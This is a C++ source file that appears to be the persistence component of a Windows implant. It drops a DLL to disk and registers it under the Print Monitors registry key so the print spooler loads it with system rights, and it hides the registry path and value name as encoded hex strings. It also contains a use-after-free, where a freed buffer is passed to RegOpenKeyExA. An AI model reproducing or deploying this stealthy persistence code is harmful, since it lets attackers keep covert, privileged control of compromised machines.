#include "persist.h"
#include "log.h"
#include "utilities.h"


bool ReadDllIntoMemory( PERSIST_STRUCT *persist_ptr ){

	bool retVal = true;
	DWORD bytesRead;

	//Check if path is emptry
	if ( persist_ptr->dll_file_path.empty() )
		return false;
	

    //open file and read its contents
	HANDLE hFile = CreateFile(persist_ptr->dll_file_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile != INVALID_HANDLE_VALUE) {

		persist_ptr->dll_file_size = GetFileSize(hFile, NULL);
		if(persist_ptr->dll_file_size != INVALID_FILE_SIZE) {

			persist_ptr->dll_file_buf = (char *)malloc( persist_ptr->dll_file_size );
			if(persist_ptr->dll_file_buf)
				
				if( !ReadFile(hFile, persist_ptr->dll_file_buf, persist_ptr->dll_file_size, &bytesRead, NULL) ) {
#ifdef _DBG
						Log("[-] ReadDllIntoMemory::ReadFile failed. \n");
#endif
						retVal = false;
				}

		} else {
#ifdef _DBG
			Log("[-] ReadDllIntoMemory::GetFileSize failed. \n");
#endif
			retVal = false;
		}
		CloseHandle(hFile);

	} else {
#ifdef _DBG
		Log("[-] ReadDllIntoMemory::CreateFile failed. \n");
#endif
		retVal = false;
	}

	return retVal;
}

bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr ){

	bool retVal = true;
	DWORD bytes_written;

	//Check if path is emptry
	if ( persist_ptr->dll_file_path.empty() )
		return false;
	

    //open file and read its contents
	HANDLE hFile = CreateFile(persist_ptr->dll_file_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile != INVALID_HANDLE_VALUE) {

		if(persist_ptr->dll_file_size != INVALID_FILE_SIZE) {
				
			if( !WriteFile(hFile, persist_ptr->dll_file_buf, persist_ptr->dll_file_size, &bytes_written, NULL) ) {
#ifdef _DBG
				Log( "[-] ReadDllIntoMemory::ReadFile failed. \n");
#endif
				retVal = false;
			}

		} else {
#ifdef _DBG
			Log("[-] ReadDllIntoMemory::GetFileSize failed. \n");
#endif
			retVal = false;
		}
		CloseHandle(hFile);

	} else {
#ifdef _DBG
		Log("[-] ReadDllIntoMemory::CreateFile failed. \n");
#endif
		retVal = false;
	}

	return retVal;
}

bool AddPersistence( PERSIST_STRUCT *persist_ptr ){

	bool retVal = true;

	//Check if path is emptry
	if ( persist_ptr->reg_key_path.empty() )
		return false;

	//Write the DLL
	WriteDllToDisk( persist_ptr );
	
	//Get the filename from the dll path
	size_t pos = persist_ptr->dll_file_path.find_last_of("\\");
	std::string file_name_str = persist_ptr->dll_file_path.substr(pos + 1, std::string::npos );

	//Check if reg key has been set for persistence
	//If the registry path was added as a configuration
	if( persist_ptr->reg_key_path.length() > 0 && file_name_str.length() > 0){
		
		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
		char *keyPath = decode_split("\x5\x3\x5\x9\x5\x3\x5\x4\x4\x5\x4\xd\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\x3\x6\x5\x7\x4\x5\xc\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\xc\x5\x0\x7\x2\x6\x9\x6\xe\x7\x4\x5\xc\x4\xd\x6\xf\x6\xe\x6\x9\x7\x4\x6\xf\x7\x2\x7\x3\x5\xc",96);
		std::string reg_key_path(keyPath);
		free(keyPath);

		//Add the name
		reg_key_path.append(persist_ptr->reg_key_path);
						
		//Check if reg key has been set for persistence
		HKEY hkey = NULL;
		long ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hkey);
		if(ret == ERROR_FILE_NOT_FOUND ) {

			//Create the key
			DWORD dwDisposition;
			if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, reg_key_path.c_str(), 0, NULL, 0, KEY_WRITE, NULL,  &hkey, &dwDisposition) == ERROR_SUCCESS) {

				//Driver
				char *driver_ptr = decode_split("\x4\x4\x7\x2\x6\x9\x7\x6\x6\x5\x7\x2",12);
				ret = RegSetValueEx (hkey, driver_ptr, 0, REG_SZ, (LPBYTE)file_name_str.c_str(), (DWORD)file_name_str.length());
				if ( ret != ERROR_SUCCESS) {
#ifdef _DBG
					Log( "[-] Error: Unable to write registry value.\n");
#endif
				}
				free(driver_ptr);
				RegCloseKey(hkey);
			}
		}			
		
	}	
	
	return retVal;

}

bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){

	bool retVal = false;

	if( !persist_ptr->reg_key_path.empty() ){

		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
		char *keyPath = decode_split("\x5\x3\x5\x9\x5\x3\x5\x4\x4\x5\x4\xd\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\x3\x6\x5\x7\x4\x5\xc\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\xc\x5\x0\x7\x2\x6\x9\x6\xe\x7\x4\x5\xc\x4\xd\x6\xf\x6\xe\x6\x9\x7\x4\x6\xf\x7\x2\x7\x3\x5\xc",96);
		std::string reg_key_path(keyPath);
		free(keyPath);
								
		//Check if reg key has been set for persistence
		HKEY hkey = NULL;
		long ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, reg_key_path.c_str(), 0, KEY_ALL_ACCESS, &hkey);
		if(ret == ERROR_SUCCESS ) {
			//Delete reg key
			RegDeleteKey(hkey, persist_ptr->reg_key_path.c_str());

		} else {
#ifdef _DBG
			Log("[-] Error: RemovePersistence:: Unable to open registry key %s.\n", keyPath);
#endif		
		}

	}

	//Check if path is emptry
	if ( !persist_ptr->dll_file_path.empty() ){
	
		//open file and read its contents
		if(  !DeleteFile(persist_ptr->dll_file_path.c_str()) ){
	#ifdef _DBG
			Log("[-] RemovePersistence::DeleteFile failed.\n");
	#endif	
		}

		retVal = true;
		
	}
	
	return retVal;

}